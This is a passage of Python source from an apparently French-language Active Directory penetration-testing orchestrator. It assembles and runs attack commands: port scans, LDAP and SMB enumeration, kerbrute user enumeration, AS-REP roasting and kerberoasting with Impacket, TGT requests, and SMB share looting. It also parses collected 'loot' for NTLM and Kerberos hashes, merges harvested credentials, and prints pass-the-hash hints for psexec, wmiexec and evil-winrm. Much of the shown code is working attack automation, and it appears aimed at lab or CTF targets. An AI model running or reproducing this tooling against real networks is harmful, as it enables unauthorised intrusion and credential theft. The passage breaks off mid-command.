    artifacts: list[str] = []
    loot_intel = extract_loot_structured_intel(out_dir)
    auto_creds_added = merge_auto_creds(out_dir, loot_intel.get("credentials") or [])

    candidates = sorted(
        (f for f in out_dir.rglob("*") if _should_auto_analyze_file(f) and f.stat().st_size > 0),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    )
    for fp in candidates[:AUTO_ANALYZE_MAX_FILES]:
        rel = str(fp.relative_to(LOOT_DIR))
        text = safe_read_text(fp, AUTO_ANALYZE_FILE_READ).strip()
        if not text:
            continue
        findings = extract_findings(text)
        aggregate["asrep_hashes"] += int(findings.get("asrep_hashes", 0) or 0)
        aggregate["kerberoast_hashes"] += int(findings.get("kerberoast_hashes", 0) or 0)
        aggregate["ntlm_hashes"] += int(findings.get("ntlm_hashes", 0) or 0)
        aggregate["smb_signing_disabled"] = aggregate["smb_signing_disabled"] or bool(findings.get("smb_signing_disabled"))
        aggregate["smb_signing_required"] = aggregate["smb_signing_required"] or bool(findings.get("smb_signing_required"))
        aggregate["winrm_open"] = aggregate["winrm_open"] or bool(findings.get("winrm_open"))
        aggregate["adcs_esc"].update(str(v) for v in (findings.get("adcs_esc") or []))
        for err in findings.get("errors", []) or []:
            if err not in aggregate["errors"]:
                aggregate["errors"].append(err)

        noteworthy = (
            findings.get("asrep_hashes")
            or findings.get("kerberoast_hashes")
            or findings.get("ntlm_hashes")
            or findings.get("smb_signing_disabled")
            or findings.get("winrm_open")
            or (findings.get("adcs_esc") or [])
            or (findings.get("errors") or [])
        )
        if noteworthy:
            analysis["interesting_files"] += 1
            if len(preview_chunks) < 8:
                preview_chunks.append(f"[{rel}]\n{text[:AUTO_ANALYZE_PREVIEW]}")

        artifacts.append(rel)

    analysis["source_files"] = len(artifacts)
    result = {
        "tool_id": "loot_auto_analysis",
        "target": "",
        "target_type": "",
        "domain": domain,
        "dc": "",
        "user": "",
        "auth_mode": "auto",
        "start": analysis["updated_at"],
        "duration": 0,
        "rc": 0,
        "status": "ok",
        "source_files": analysis["source_files"],
        "interesting_files": analysis["interesting_files"],
        "findings": {
            "asrep_hashes": aggregate["asrep_hashes"],
            "kerberoast_hashes": aggregate["kerberoast_hashes"],
            "ntlm_hashes": aggregate["ntlm_hashes"],
            "smb_signing_disabled": aggregate["smb_signing_disabled"],
            "smb_signing_required": aggregate["smb_signing_required"],
            "winrm_open": aggregate["winrm_open"],
            "adcs_esc": sorted(aggregate["adcs_esc"]),
            "errors": aggregate["errors"][:20],
        },
        "artifacts": artifacts[:200],
        "loot_intel": loot_intel,
        "auto_creds_added": auto_creds_added,
        "output_preview": "\n\n".join(preview_chunks)[:MAX_CAPTURE_CHARS],
        "updated_at": analysis["updated_at"],
    }

    latest_path = parsed_dir / "loot_auto_analysis.json"
    ts = datetime.fromtimestamp(analysis["updated_at"]).strftime("%Y%m%d_%H%M%S")
    history_path = history_dir / f"{ts}_loot_auto_analysis.json"
    latest_path.write_text(json.dumps(result, indent=2))
    history_path.write_text(json.dumps(result, indent=2))
    analysis["path"] = str(latest_path.relative_to(LOOT_DIR))
    return analysis


def list_loot_files(domain: str) -> list[dict]:
    files = []
    if not domain:
        return files
    base = get_output_dir(domain)
    sync_external_loot_artifacts(base)
    if base.exists():
        for f in sorted(base.rglob("*")):
            if f.is_file() and f.stat().st_size > 0:
                files.append({
                    "path": str(f.relative_to(LOOT_DIR)),
                    "size": f.stat().st_size,
                    "mtime": f.stat().st_mtime,
                })
    return files

def collect_recent_artifacts(out_dir: Path, start_time: float) -> list[str]:
    artifacts = []
    for f in sorted(out_dir.rglob("*")):
        try:
            if f.is_file() and f.stat().st_size > 0 and f.stat().st_mtime >= start_time - 1:
                artifacts.append(str(f.relative_to(LOOT_DIR)))
        except FileNotFoundError:
            continue
    return artifacts


def sync_external_loot_artifacts(out_dir: Path) -> None:
    """Mirror useful external tool artifacts into loot/ so the UI can see them."""
    responder_src = Path("/usr/share/responder/logs")
    responder_dst = out_dir / "attack_checks" / "responder_logs"
    try:
        if responder_src.exists() and responder_src.is_dir():
            responder_dst.mkdir(parents=True, exist_ok=True)
            now = time.time()
            for src in responder_src.rglob("*"):
                try:
                    if not src.is_file() or src.stat().st_size <= 0:
                        continue
                    # Keep the sync focused on recent captures to avoid copying stale clutter forever.
                    if src.stat().st_mtime < now - 172800:
                        continue
                    rel = src.relative_to(responder_src)
                    dst = responder_dst / rel
                    dst.parent.mkdir(parents=True, exist_ok=True)
                    if dst.exists():
                        same_size = dst.stat().st_size == src.stat().st_size
                        same_mtime = int(dst.stat().st_mtime) == int(src.stat().st_mtime)
                        if same_size and same_mtime:
                            continue
                    shutil.copy2(src, dst)
                except Exception:
                    continue
    except Exception:
        pass

def clear_responder_native_logs(sudo_password: str = "") -> bool:
    responder_dir = Path("/usr/share/responder/logs")
    if not responder_dir.exists() or not responder_dir.is_dir():
        return False

    cleared = False
    for child in list(responder_dir.iterdir()):
        try:
            if child.is_dir():
                shutil.rmtree(child, ignore_errors=True)
            else:
                child.unlink(missing_ok=True)
            cleared = True
        except Exception:
            if sudo_password and shutil.which("sudo"):
                try:
                    proc = subprocess.run(
                        ["sudo", "-S", "-p", "", "rm", "-rf", "--", str(child)],
                        input=f"{sudo_password}\n",
                        text=True,
                        capture_output=True,
                        timeout=10,
                    )
                    if proc.returncode == 0:
                        cleared = True
                except Exception:
                    pass
    return cleared

def persist_module_result(tool_id: str, cfg: dict, entry: dict, output: str, out_dir: Path) -> Path:
    sync_external_loot_artifacts(out_dir)
    parsed_dir = out_dir / "parsed"
    history_dir = parsed_dir / "runs"
    parsed_dir.mkdir(exist_ok=True)
    history_dir.mkdir(exist_ok=True)

    result = {
        "tool_id": tool_id,
        "target": cfg.get("target", ""),
        "target_type": cfg.get("target_type", ""),
        "domain": cfg.get("domain", ""),
        "dc": cfg.get("dc", ""),
        "user": cfg.get("user", ""),
        "auth_mode": "ccache" if cfg.get("ccache") else "nt_hash" if cfg.get("nt_hash") else "password" if cfg.get("password") else "anonymous",
        "start": entry.get("start"),
        "duration": entry.get("duration", 0),
        "rc": entry.get("rc"),
        "status": "ok" if entry.get("rc") == 0 else "error",
        "findings": extract_findings(output),
        "artifacts": collect_recent_artifacts(out_dir, float(entry.get("start") or time.time())),
        "output_preview": output[:4000],
        "updated_at": time.time(),
    }

    latest_path = parsed_dir / f"{tool_id}.json"
    ts = datetime.fromtimestamp(entry.get("start") or time.time()).strftime("%Y%m%d_%H%M%S")
    history_path = history_dir / f"{ts}_{tool_id}.json"
    latest_path.write_text(json.dumps(result, indent=2))
    history_path.write_text(json.dumps(result, indent=2))
    return latest_path


def persist_run_manifest(cfg: dict, manifest: dict) -> Path:
    out_dir = get_output_dir(cfg.get("domain", ""))
    parsed_dir = out_dir / "parsed"
    manifest_dir = parsed_dir / "manifests"
    parsed_dir.mkdir(parents=True, exist_ok=True)
    manifest_dir.mkdir(exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    safe_name = SAFE_OUTPUT_RE.sub("_", cfg.get("domain") or cfg.get("target") or "run").strip("_") or "run"
    manifest_path = manifest_dir / f"{ts}_{safe_name}.json"
    payload = {
        "target": cfg.get("target", ""),
        "target_type": cfg.get("target_type", ""),
        "domain": cfg.get("domain", ""),
        "dc": cfg.get("dc", ""),
        "auth_mode": "ccache" if cfg.get("ccache") else "nt_hash" if cfg.get("nt_hash") else "password" if cfg.get("password") else "anonymous",
        "saved_at": time.time(),
        "manifest": manifest or {},
    }
    manifest_path.write_text(json.dumps(payload, indent=2))
    latest_path = manifest_dir / "latest.json"
    latest_path.write_text(json.dumps(payload, indent=2))
    return manifest_path

def _find(*bins) -> str | None:
    for b in bins:
        if shutil.which(b): return b
    return None

def get_nxc()      -> str: return _find("nxc","crackmapexec") or "nxc"
def get_certipy()  -> str: return _find("certipy-ad","certipy") or "certipy-ad"
def get_bloodyad() -> str: return _find("bloodyAD","bloodyad") or "bloodyAD"
def get_pkinittools_dir() -> str:
    local_dir = BASE_DIR / "PKINITtools"
    if local_dir.is_dir():
        return str(local_dir)
    return str(BASE_DIR / "PKINITtools")
def get_impacket(tool: str) -> str:
    variants = {
        "GetNPUsers":  ["impacket-GetNPUsers","impacket-getnpusers"],
        "GetUserSPNs": ["impacket-GetUserSPNs","impacket-getuserspns"],
        "getTGT":      ["impacket-getTGT","impacket-GetTGT"],
        "secretsdump": ["impacket-secretsdump","secretsdump.py"],
        "psexec":      ["impacket-psexec","psexec.py"],
        "wmiexec":     ["impacket-wmiexec","wmiexec.py"],
        "ntlmrelayx":  ["impacket-ntlmrelayx","ntlmrelayx.py"],
        "mssqlclient": ["impacket-mssqlclient","mssqlclient.py"],
        "rbcd":        ["impacket-rbcd","rbcd.py"],
        "dacledit":    ["impacket-dacledit","dacledit.py"],
        "owneredit":   ["impacket-owneredit","owneredit.py"],
        "addcomputer": ["impacket-addcomputer","addcomputer.py"],
        "getST":       ["impacket-getST","getST.py"],
    }
    return _find(*(variants.get(tool,[]))) or f"impacket-{tool.lower()}"

def script_available() -> bool:
    return SCRIPT_PATH.exists() and os.access(SCRIPT_PATH, os.X_OK)

def shell_quote(value: str) -> str:
    return shlex.quote(value)

def shell_assign(name: str, value: str) -> str:
    return f"{name}={shell_quote(value)}"

def normalize_cfg(cfg: dict) -> dict:
    cleaned = {}
    for key in ("ui_language", "target", "user", "password", "sudo_password", "domain", "dc", "nt_hash", "ccache", "target_type", "op_mode", "target_account"):
        val = cfg.get(key, "")
        if val is None:
            val = ""
        if isinstance(val, str):
            val = val.replace("\x00", "").strip()
        else:
            val = str(val)
        cleaned[key] = val
    cleaned["ui_language"] = cleaned["ui_language"] if cleaned["ui_language"] in {"fr", "en"} else "fr"
    cleaned["target_type"] = cleaned["target_type"] if cleaned["target_type"] in {"windows", "linux", "web", "hybrid"} else "windows"
    cleaned["op_mode"] = cleaned["op_mode"] if cleaned["op_mode"] in ENABLED_OP_MODES else DEFAULT_OP_MODE
    # Ports
    wp = str(cfg.get("web_port", "") or "").strip()
    cleaned["web_port"] = wp if (wp.isdigit() and 1 <= int(wp) <= 65535) else "80"
    sp2 = str(cfg.get("ssh_port", "") or "").strip()
    cleaned["ssh_port"] = sp2 if (sp2.isdigit() and 1 <= int(sp2) <= 65535) else "22"
    # Notes
    cleaned["notes"] = str(cfg.get("notes", "") or "").strip()[:1000]
    return cleaned

def output_key(domain: str) -> str:
    key = SAFE_OUTPUT_RE.sub("_", (domain or "").strip().lower()).strip("._-")
    return key[:128] or "output"

def get_output_dir(domain: str) -> Path:
    return LOOT_DIR / output_key(domain)

def resolve_loot_path(rel_path: str) -> Path:
    rel = (rel_path or "").replace("\x00", "").strip()
    candidate = (LOOT_DIR / rel).resolve()
    loot_root = LOOT_DIR.resolve()
    if not candidate.is_relative_to(loot_root):
        raise ValueError("chemin hors loot/")
    return candidate


def normalize_loot_rel_path(out_dir: Path, rel_path: str) -> str:
    rel = str(rel_path or "").replace("\x00", "").replace("\\", "/").strip().lstrip("/")
    if not rel:
        return ""
    try:
        domain_root = str(out_dir.relative_to(LOOT_DIR)).replace("\\", "/").strip("/")
    except Exception:
        domain_root = ""
    if not domain_root:
        return rel
    if rel == domain_root or rel.startswith(domain_root + "/"):
        return rel
    return f"{domain_root}/{rel}"


def normalize_loot_item_paths(out_dir: Path, items: list) -> list:
    normalized: list = []
    for item in items or []:
        if isinstance(item, dict):
            fixed = dict(item)
            if fixed.get("path"):
                fixed["path"] = normalize_loot_rel_path(out_dir, str(fixed.get("path", "")))
            normalized.append(fixed)
        else:
            normalized.append(item)
    return normalized


def normalize_loot_section_paths(out_dir: Path, sections: list[dict]) -> list[dict]:
    normalized: list[dict] = []
    for section in sections or []:
        if not isinstance(section, dict):
            continue
        fixed = dict(section)
        fixed["items"] = normalize_loot_item_paths(out_dir, fixed.get("items", []) or [])
        normalized.append(fixed)
    return normalized

# ── Map tool_id → fonction du script ──────────────────────────────────
def build_command(tool_id: str, cfg: dict) -> list[str] | None:
    cfg = normalize_cfg(cfg)
    t  = cfg.get("target","")
    u  = cfg.get("user","")
    p  = cfg.get("password","")
    sp = cfg.get("sudo_password","")
    d  = cfg.get("domain","")
    dc = cfg.get("dc", f"DC01.{d}" if d else "")
    nt = cfg.get("nt_hash","")
    cc = cfg.get("ccache","")
    ta = cfg.get("target_account","")
    out = str(get_output_dir(d))
    dn  = ",".join(f"DC={x}" for x in d.split(".")) if d else ""
    nxc = get_nxc()
    wp   = cfg.get("web_port","80") or "80"
    sshp = cfg.get("ssh_port","22") or "22"
    qt, qu, qp = shell_quote(t), shell_quote(u), shell_quote(p)
    qd, qdc, qnt = shell_quote(d), shell_quote(dc), shell_quote(nt)
    qcc, qout, qdn = shell_quote(cc), shell_quote(out), shell_quote(dn)
    qpkdir = shell_quote(get_pkinittools_dir())
    qta = shell_quote(ta)
    # Web URL with configurable port
    if wp in ("443","8443"):
        web_url = f"https://{t}" if wp == "443" else f"https://{t}:{wp}"
    elif wp == "80":
        web_url = f"http://{t}"
    else:
        web_url = f"http://{t}:{wp}"
    qweb_url = shell_quote(web_url)
    # SSH helper — runs cmd on target via SSH (sshpass if password available)
    def ssh_run(cmd: str, out_file: str = "") -> str:
        redir = f" 2>&1 | tee {shell_quote(out_file)}" if out_file else " 2>&1"
        if u and p:
            return (f"command -v sshpass >/dev/null && "
                    f"sshpass -p {qp} ssh -p {sshp} -o StrictHostKeyChecking=no "
                    f"-o ConnectTimeout=10 {shell_quote(f'{u}@{t}')} {shell_quote(cmd)}{redir} || "
                    f"echo '[!] sshpass manquant ou connexion échouée — exécuter manuellement : {cmd}'")
        elif u:
            return (f"ssh -p {sshp} -o StrictHostKeyChecking=no -o BatchMode=yes "
                    f"{shell_quote(f'{u}@{t}')} {shell_quote(cmd)}{redir} || "
                    f"echo '[!] Auth SSH non disponible — exécuter manuellement : {cmd}'")
        else:
            return f"echo '[!] User SSH requis'; echo 'Commande à exécuter sur la cible :'; echo {shell_quote(cmd)}"

    # ── Commandes directes (source unique de vérité : Python) ─────────
    def nxc_smb() -> str:
        base = f"{shell_quote(nxc)} smb {qt}"
        if cc:   return f"KRB5CCNAME={qcc} {base} --use-kcache"
        if nt:   return f"{base} -u {qu} -H {qnt} -d {qd}"
        if u:    return f"{base} -u {qu} -p {qp} -d {qd}"
        return base

    def ldap_bind() -> str:
        if cc: return "-Y GSSAPI"
        if u:  return f"-D {shell_quote(f'{u}@{d}')} -w {qp}"
        return "-x"

    def imp_auth(bin: str, spec: str, target: str, extra: str = "") -> str:
        if cc:  return f"KRB5CCNAME={qcc} {shell_quote(bin)} -k -no-pass {shell_quote(f'{spec}@{target}')} {extra}"
        if nt:  return f"{shell_quote(bin)} -hashes {shell_quote(':' + nt)} {shell_quote(f'{spec}@{target}')} {extra}"
        return  f"{shell_quote(bin)} {shell_quote(f'{spec}:{p}@{target}')} {extra}"

    if u:
        psexec_hint = f"psexec   : impacket-psexec {d}/{u}"
        wmiexec_hint = f"wmiexec  : impacket-wmiexec {d}/{u}"
        if nt:
            psexec_hint += f" -hashes :{nt}@{t}"
            wmiexec_hint += f" -hashes :{nt}@{t}"
            evil_hint = f"evil-winrm : evil-winrm -i {t} -u {u} -H {nt}"
        else:
            psexec_hint += f":PASS@{t}"
            wmiexec_hint += f":PASS@{t}"
            evil_hint = f"evil-winrm : evil-winrm -i {t} -u {u} -p PASS"
        rdp_hint = f"xfreerdp : xfreerdp /u:{u} /v:{t} /cert:ignore"
    else:
        psexec_hint = wmiexec_hint = evil_hint = rdp_hint = ""
    sudo_prefix = f"echo {shell_quote(p)} | sudo -S" if p else "sudo"

    cmds: dict[str, list | None] = {

        "nmap_baseline": [
            "nmap","-A","-Pn","-sC","-sV",t,
            "-oN",f"{out}/nmapresult.txt","-oX",f"{out}/nmapresult.xml"
        ] if t else None,

        "rustscan_fast": ["bash","-c",
            f"mkdir -p {qout}; "
            f"command -v rustscan >/dev/null || {{ echo '[!] rustscan manquant. Installe : cargo install rustscan'; echo '[*] Ou relance ./install.sh ou ./install_missing.sh'; echo '[*] Fallback sur nmap -F (top 100 ports)...'; nmap -F -Pn {qt} -oN {qout}/rustscan_fallback.txt 2>&1; exit 0; }}; "
            f"echo '[*] rustscan full sweep 65535 ports → target ' {qt}; "
            f"rustscan -a {qt} --ulimit 5000 --range 1-65535 --accessible --greppable 2>&1 | tee {qout}/rustscan.txt | head -60; "
            f"echo ''; echo '[+] Ports ouverts sauvegardés dans {out}/rustscan.txt'"
        ] if t else None,

        "nmap_targeted": ["bash","-c",
            f"mkdir -p {qout}; "
            f"if [ -f {qout}/rustscan.txt ]; then "
            f"  PORTS=$(grep -oE 'Open [0-9.]+:[0-9]+' {qout}/rustscan.txt | grep -oE '[0-9]+$' | sort -n -u | paste -sd','); "
            f"else PORTS=''; fi; "
            f"if [ -z \"$PORTS\" ]; then "
            f"  echo '[!] Pas de rustscan.txt → lance d abord rustscan_fast'; "
            f"  echo '[*] Fallback nmap sur top-1000...'; "
            f"  nmap -Pn -sC -sV {qt} -oN {qout}/nmapresult.txt -oX {qout}/nmapresult.xml 2>&1 | tail -60; "
            f"else "
            f"  echo \"[*] nmap -sC -sV -p $PORTS {t}\"; "
            f"  nmap -Pn -sC -sV -p $PORTS {qt} -oN {qout}/nmapresult.txt -oX {qout}/nmapresult.xml 2>&1 | tail -80; "
            f"fi"
        ] if t else None,

        "hosts_autoconf": ["bash","-c",
            f"mkdir -p {qout}; "
            f"NMAP={qout}/nmapresult.txt; "
            f"if [ ! -f $NMAP ]; then echo '[!] Pas de nmapresult.txt — lance nmap_baseline/nmap_targeted avant'; exit 0; fi; "
            f"FQDNS=$(grep -oiE '[a-z0-9_-]+\\.[a-z0-9_-]+(\\.[a-z0-9_-]+)*' $NMAP | grep -iE '(\\.htb|\\.local|\\.corp|\\.lab|\\.internal)' | sort -u); "
            f"DCNAME=$(grep -oiE 'commonName=[^,]+' $NMAP | sed 's/commonName=//' | sort -u | head -3); "
            f"[ -n \"$DCNAME\" ] && FQDNS=\"$FQDNS\"$'\\n'\"$DCNAME\"; "
            f"FQDNS=$(echo \"$FQDNS\" | sort -u | grep -v '^$'); "
            f"if [ -z \"$FQDNS\" ]; then echo '[!] Aucun FQDN détecté dans $NMAP'; exit 0; fi; "
            f"echo '[*] FQDN détectés :'; echo \"$FQDNS\" | sed 's/^/  → /'; "
            f"echo ''; echo '[*] Préparation entrée /etc/hosts pour ' {qt}; "
            f"HOSTLINE=\"{t} $(echo \"$FQDNS\" | tr '\\n' ' ')\"; "
            f"echo \"[*] Ligne : $HOSTLINE\"; "
            f"if grep -q \"^{t}\\b\" /etc/hosts; then "
            f"  echo '[!] Entrée {t} déjà présente dans /etc/hosts :'; grep \"^{t}\\b\" /etc/hosts; "
            f"  echo '[*] Suppression ancienne ligne + ajout nouvelle via sudo...'; "
            f"  {sudo_prefix} sed -i \"/^{t}\\b/d\" /etc/hosts 2>&1 | head -2; "
            f"fi; "
            f"echo \"$HOSTLINE\" | {sudo_prefix} tee -a /etc/hosts >/dev/null && "
            f"echo '[+] /etc/hosts mis à jour' || echo '[!] sudo échoué — ajoute manuellement : '\"$HOSTLINE\""
        ] if t else None,

        "smb_signing": ["bash","-c",
            f"{shell_quote(nxc)} smb {qt} --gen-relay-list {qout}/smb_relay_targets.txt 2>&1 || "
            f"nmap -p 445 --script smb2-security-mode {qt} 2>&1"
        ] if t else None,

        "winrm_checks": ["bash","-c",
            f"mkdir -p {qout}/attack_checks; "
            f"echo '=== WinRM 5985 /wsman ==='; "
            f"curl -skI --max-time 6 http://{t}:5985/wsman 2>&1 "
            f"| tee {qout}/attack_checks/winrm_wsman_5985_headers.txt; "
            f"echo ''; echo '=== WinRM 5986 /wsman (TLS) ==='; "
            f"curl -skI --max-time 6 https://{t}:5986/wsman 2>&1 "
            f"| tee {qout}/attack_checks/winrm_wsman_5986_headers.txt"
            + (f"; echo ''; echo '=== nxc winrm auth ==='; "
               + (f"KRB5CCNAME={qcc} {shell_quote(nxc)} winrm {qt} -u {qu} -d {qd} --use-kcache"
                  if cc else
                  f"{shell_quote(nxc)} winrm {qt} -u {qu} -H {qnt} -d {qd}"
                  if nt else
                  f"{shell_quote(nxc)} winrm {qt} -u {qu} -p {qp} -d {qd}")
               + f" 2>&1 | tee {qout}/attack_checks/winrm_auth_test.txt"
               if u and (p or nt or cc) else "")
        ] if t else None,

        "ntp_sync": ["bash","-c",
            (f"printf '%s\\n' {shell_quote(sp)} | sudo -S -p '' timedatectl set-ntp false 2>/dev/null || true; "
             if sp else
             "sudo -n timedatectl set-ntp false 2>/dev/null || true; ")
            + f"ntpdate -q {qdc} 2>&1 | head -5; ntpdate -q {qt} 2>&1 | head -5"
        ] if t else None,

        "snmp_enum": ["bash","-c",
            f"WLIST=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt; "
            f"[ -f $WLIST ] && onesixtyone -c $WLIST {qt} 2>&1 || true; "
            f"snmpwalk -v2c -c public {qt} 2>&1 | head -60"
        ] if t else None,

        "ftp_enum": ["bash","-c",
            f"curl -s --max-time 12 {shell_quote(f'ftp://{t}/')} --user {shell_quote(f'anonymous:anonymous@{t}')} -v 2>&1 | head -50"
        ] if t else None,

        "web_enum": ["bash","-c",
            f"curl -ksLI --max-time 8 {shell_quote(f'http://{t}')} 2>&1 | head -20; "
            f"curl -ksLI --max-time 8 {shell_quote(f'https://{t}')} 2>&1 | head -20"
        ] if t else None,

        "dns_enum": ["bash","-c",
            f"mkdir -p {qout}/dns_enum; "
            f"dig @{qt} {qd} AXFR +time=3 2>&1 | tee {qout}/dns_enum/axfr.txt | head -40; "
            f"dig @{qt} {shell_quote(f'_ldap._tcp.dc._msdcs.{d}')} SRV +short 2>&1; "
            f"dig @{qt} {shell_quote(f'_kerberos._tcp.{d}')} SRV +short 2>&1"
        ] if t and d else None,

        "nxc_anon_probe": ["bash","-c",
            f"{shell_quote(nxc)} smb {qt} --timeout 15 --smb-timeout 5 2>&1; "
            f"{shell_quote(nxc)} smb {qt} --shares --timeout 15 --smb-timeout 5 2>&1"
        ] if t else None,

        "smbclient_list": ["bash","-c",
            f"smbclient -L {qt} -N 2>&1; "
            + (f"smbclient -L {qt} -U {shell_quote(f'{u}%{p}')} -W {qd} 2>&1" if u and not nt else "true")
        ] if t else None,

        "nxc_smb_shares":  ["bash","-c", f"{nxc_smb()} --shares 2>&1"] if t else None,
        "nxc_smb_users":   ["bash","-c", f"{nxc_smb()} --users 2>&1"] if t else None,
        "nxc_smb_passpol": ["bash","-c", f"{nxc_smb()} --pass-pol 2>&1"] if t else None,
        "nxc_rid_brute":   ["bash","-c", f"{nxc_smb()} --rid-brute 2>&1"] if t and (u or nt or cc) else None,

        "smb_loot": ["bash","-c",
            f"mkdir -p {qout}/downloads; "
            f"TARGET_HOST={qt}; "
            f"for share in SYSVOL NETLOGON; do "
            f"  echo \"=== $share ===\"; "
            f"  smbclient \"//$TARGET_HOST/$share\" "
            + (f"-U {shell_quote(f'{u}%{p}')} -W {qd}" if u and not nt and not cc else "-N")
            + f" -c 'recurse ON; prompt OFF; ls' 2>&1 | head -40; done"
        ] if t else None,

        "ldap_anon_base": [
            "ldapsearch","-x","-H",f"ldap://{t}","-s","base","namingcontexts"
        ] if t else None,

        "ldap_users_auth": ["bash","-c",
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} "
            f"-b {qdn} '(objectClass=user)' sAMAccountName memberOf 2>&1 | head -120"
        ] if t and u and dn else None,

        "ldap_kerberoastable": ["bash","-c",
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))' "
            f"sAMAccountName servicePrincipalName 2>&1"
        ] if t and u and dn else None,

        "ldap_asrep_candidates": ["bash","-c",
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' "
            f"sAMAccountName 2>&1; "
            f"echo '--- adminCount=1 ---'; "
            f"ldapsearch -x -H {shell_quote(f'ldap://{t}')} {ldap_bind()} -b {qdn} "
            f"'(&(objectClass=user)(adminCount=1))' sAMAccountName 2>&1 | grep sAMAccount"
        ] if t and u and dn else None,

        "ldapdomaindump": ["bash","-c",
            f"mkdir -p {qout}/ldapdomaindump; "
            # Essai 1 : SIMPLE auth avec UPN (user@domain) — compatible LDAP standard AD
            f"echo '=== Tentative 1 : SIMPLE auth (user@domain) ==='; "
            f"ldapdomaindump -at SIMPLE -u {shell_quote(f'{u}@{d}')} -p {qp} "
            f"-o {qout}/ldapdomaindump -n {qt} {shell_quote(f'ldap://{t}')} 2>&1 | tee {qout}/ldapdomaindump/_attempt_simple.log; "
            f"if ls {qout}/ldapdomaindump/domain_users.json >/dev/null 2>&1; then "
            f"  echo '[+] SIMPLE auth réussie'; exit 0; "
            f"fi; "
            # Essai 2 : NTLM avec nom NetBIOS (partie avant le premier .)
            f"NETBIOS=$(echo {qd} | cut -d. -f1 | tr '[:lower:]' '[:upper:]'); "
            f"echo ''; echo \"=== Tentative 2 : NTLM auth ($NETBIOS\\\\{u}) ===\"; "
            f"ldapdomaindump -at NTLM -u \"$NETBIOS\\\\{u}\" -p {qp} "
            f"-o {qout}/ldapdomaindump -n {qt} {shell_quote(f'ldap://{t}')} 2>&1 | tee {qout}/ldapdomaindump/_attempt_ntlm.log"
        ] if t and u and p and not nt and not cc else None,

        "ldaps_probe": ["bash","-c",
            f"ldapsearch -x -H {shell_quote(f'ldaps://{t}:636')} -s base namingcontexts 2>&1; "
            + (f"ldapsearch -x -H {shell_quote(f'ldaps://{t}:636')} {ldap_bind()} "
               f"-b {qdn} '(objectClass=user)' sAMAccountName 2>&1 | head -40"
               if u and dn else "echo 'No auth'")
        ] if t else None,

        "kerbrute_userenum": ["bash","-c",
            f"WLIST=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt; "
            f"[ -f $WLIST ] || WLIST=/usr/share/wordlists/rockyou.txt; "
            f"TIMEOUT_BIN=$(command -v timeout || true); "
            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 90s }}; "
            f"${{RUNNER}}kerbrute userenum -d {qd} --dc {qt} "
            f"<(head -n 5000 $WLIST) 2>&1 | tee {qout}/kerbrute_userenum.txt | head -80"
        ] if t and d and shutil.which("kerbrute") else None,

        "getnpusers_asrep": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('GetNPUsers'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'GetNPUsers introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/kerberos; "
            f"UFILE={qout}/users.txt; [ -f $UFILE ] || echo {qu} > $UFILE; "
            f"TIMEOUT_BIN=$(command -v timeout || true); "
            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
            + (f"${{RUNNER}}env KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
               f"-usersfile $UFILE 2>&1 | tee {qout}/kerberos/asrep_hashes.txt"
               if cc else
               f"${{RUNNER}}$TOOL {shell_quote(f'{d}/')} -dc-ip {qt} -no-pass -usersfile $UFILE 2>&1 "
               f"| tee {qout}/kerberos/asrep_hashes.txt")
        ] if t and d else None,

        "getuserspns_kerberoast": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('GetUserSPNs'))}; "
            f"command -v $TOOL >/dev/null || {{ echo 'GetUserSPNs introuvable'; exit 1; }}; "
            f"mkdir -p {qout}/kerberos; "
            f"TIMEOUT_BIN=$(command -v timeout || true); "
            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
            + (f"${{RUNNER}}env KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
               f"-request -outputfile {qout}/kerberos/tgs_hashes.txt 2>&1"
               if cc else
               f"${{RUNNER}}$TOOL {shell_quote(f'{d}/{u}:{p}')} -dc-ip {qt} "
               f"-request -outputfile {qout}/kerberos/tgs_hashes.txt 2>&1"
               if u else "echo 'Credentials requis'")
        ] if t and d else None,

        "gettgt": ["bash","-c",
            f"TOOL={shell_quote(get_impacket('getTGT'))}; "
            f"command -v $TOOL >/dev/null || {{ echo '[!] getTGT introuvable — apt install python3-impacket'; exit 1; }}; "
            f"mkdir -p {qout}/attack_checks {qout}/kerberos; "
            f"CC_DEST={qout}/attack_checks/{shell_quote(f'{u}.ccache')}; "
            f"KLIST_FILE={qout}/kerberos/klist.txt; "
            f"TIMEOUT_BIN=$(command -v timeout || true); "
            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
            f"echo '=== getTGT ({d.upper()}/{u}) ==='; "
            + "echo '[*] Si Kerberos échoue, lance d abord krb5_setup pour forcer la sync NTP sur le DC.'; "
            + (f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}')} -hashes {shell_quote(':' + nt)} -dc-ip {qt} </dev/null 2>&1"
               if nt else
               f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}:{p}')} -dc-ip {qt} </dev/null 2>&1")
            + f"; CC_SRC=$(ls -t {shell_quote(f'{u}.ccache')} 2>/dev/null | head -1); "
            f"if [ -n \"$CC_SRC\" ] && [ -f \"$CC_SRC\" ]; then "
            f"  mv \"$CC_SRC\" \"$CC_DEST\" 2>/dev/null || cp \"$CC_SRC\" \"$CC_DEST\"; "
            f"  echo ''; echo '=== ccache stocké ==='; echo \"$CC_DEST\"; "
            f"  echo ''; echo '=== klist (persisté dans kerberos/klist.txt) ==='; "
